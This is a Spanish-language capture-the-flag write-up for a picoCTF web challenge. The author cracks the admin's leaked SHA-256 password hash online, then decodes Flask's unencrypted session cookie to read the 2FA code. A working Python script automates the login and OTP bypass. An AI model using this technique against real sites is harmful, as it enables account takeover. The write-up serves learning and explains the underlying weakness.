**Área:** Web **Dificultad:** Medio **Plataforma:** picoCTF 2026 **Link del reto o Nombre:** No FA (Web Exploitation, 200 pts) **Resuelto por:** Diego **Fecha:** 25/07 **Tiempo que tardé:** [completar]

---

## ¿Qué pista/detalle me hizo saber por dónde ir?

el intento de fuerza bruta con threads fallaba por una condición de carrera (un thread encontraba el OTP correcto pero otro con un intento fallido pisaba la cookie antes de poder usarla). Eso me hizo mirar con más atención QUÉ era exactamente esa cookie de sesión que se estaba pisando, y ahí caí en la cuenta de que Flask, por defecto, guarda la sesión del lado del cliente: la cookie está firmada (no se puede _modificar_ sin la SECRET_KEY del servidor) pero **no está encriptada**, solo codificada en base64 + comprimida con zlib — así que se puede _leer_ su contenido sin ningún secreto. El OTP nunca estuvo protegido, estaba escrito en texto plano dentro de mi propia cookie todo el tiempo.

## Herramienta(s) que usé

DB Browser for SQLite (o sqlite3), md5decrypt.net (para el hash), Python (requests, base64, zlib, json)

## Pasos (solo lo esencial, tipo lista)

- abrí `users.db` y encontré la tabla de usuarios con username, email y password — la columna `password` no tenía la contraseña en texto plano, sino un string de 64 caracteres hexadecimales
- ese largo (64 caracteres hex) es la firma característica de un hash **SHA-256** (MD5 tiene 32, SHA-1 tiene 40, SHA-256 tiene 64) — y al revisar `app.py` se confirmó del todo, porque el login literalmente hace `hashlib.sha256(password.encode()).hexdigest()` y lo compara contra ese campo
- vi que el usuario `admin` era el único con `two_fa = 1` (verificación OTP activada) — el objetivo lógico a atacar
- en vez de armar un script de cracking, usé una página web para descifrar hashes SHA-256 (https://md5decrypt.net/en/Sha256/), pegué el hash del admin (`c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67`) y me devolvió la contraseña en texto plano: `apple@123`
- logueado con `admin` / `apple@123`, el sitio pedía un OTP de 4 dígitos en `/two_fa`; en `app.py` vi que ese endpoint no tenía límite de intentos, solo una ventana de 120 segundos desde que se generaba
- mi primer intento fue un script de fuerza bruta del OTP (0-9999) con threads en paralelo compartiendo una `requests.Session()` — no funcionó de forma confiable: por la concurrencia, la cookie con la sesión ya autenticada se pisaba con la de otro intento fallido antes de poder usarla
- al investigar por qué se pisaba esa cookie, terminé mirando su contenido crudo — y noté que Flask no la encripta, solo la firma con `itsdangerous`. El valor de la cookie tiene el formato `payload.timestamp.firma`, donde el `payload` es simplemente base64 + zlib (comprimido si empieza con un punto `.`) — se puede decodificar sin la SECRET_KEY, solo no se puede _falsificar_ sin ella
- abandoné la fuerza bruta por completo: decodifiqué la cookie de sesión (base64 url-safe + zlib) justo después del login y encontré el campo `otp_secret` en texto plano, con el OTP real que el servidor había generado para mí
- con el OTP leído directo de la cookie, lo mandé en un único POST a `/two_fa`, sin adivinar nada — la solución final se resolvió solo con esto, sin ninguna fuerza bruta
- quedé logueado como `admin` y la flag apareció en la home

## Comando(s) o payload clave (si aplica)

```python
import requests, base64, zlib, json

BASE = "http://foggy-cliff.picoctf.net:53707"

def decode_flask_session(cookie_value):
    # la cookie de sesion de Flask viene como: payload.timestamp.firma
    # si el payload esta comprimido, la cookie completa arranca con un '.'
    compressed = cookie_value.startswith('.')
    rest = cookie_value[1:] if compressed else cookie_value
    payload_b64 = rest.split('.')[0]
    padding = '=' * (-len(payload_b64) % 4)
    raw = base64.urlsafe_b64decode(payload_b64 + padding)
    if compressed:
        raw = zlib.decompress(raw)
    return raw

s = requests.Session()
s.post(f"{BASE}/login", data={"username": "admin", "password": "apple@123"})

cookie_value = s.cookies.get('session')
data = json.loads(decode_flask_session(cookie_value))
otp = data['otp_secret']   # el OTP estaba en texto plano adentro de la cookie

s.post(f"{BASE}/two_fa", data={"otp": otp})
print(s.get(f"{BASE}/").text)
```

## Flag

`picoCTF{n0_r4t3_n0_4uth_2b765193}`

## ¿Qué aprendí / qué usaría de nuevo?

que un hash de 64 caracteres hexadecimales es SHA-256, y que sitios como md5decrypt.net son una forma rápida de crackear hashes comunes sin correr nada localmente. Pero lo más importante: las sesiones de Flask por defecto son solo firmadas, no encriptadas — cualquiera puede leer su contenido (aunque no modificarlo sin la SECRET_KEY), así que si algo "sensible" como un OTP se guarda en `session[...]`, ya está filtrado del lado del cliente. La próxima vez que vea un endpoint con OTP/2FA en Flask, voy a mirar la cookie de sesión ANTES de pensar en fuerza bruta.

## ¿Me trabé en algo? ¿Cómo lo destrabé?

sí, al intentar fuerza bruta del OTP con threads compartiendo una misma `requests.Session()`, tuve una condición de carrera que pisaba la cookie recién actualizada antes de poder usarla. Ese mismo problema fue justo lo que me hizo fijarme en el contenido de la cookie en sí — al investigar por qué se pisaba, descubrí que era legible sin secreto alguno, y terminé resolviendo el reto solo con eso, sin usar la fuerza bruta para nada

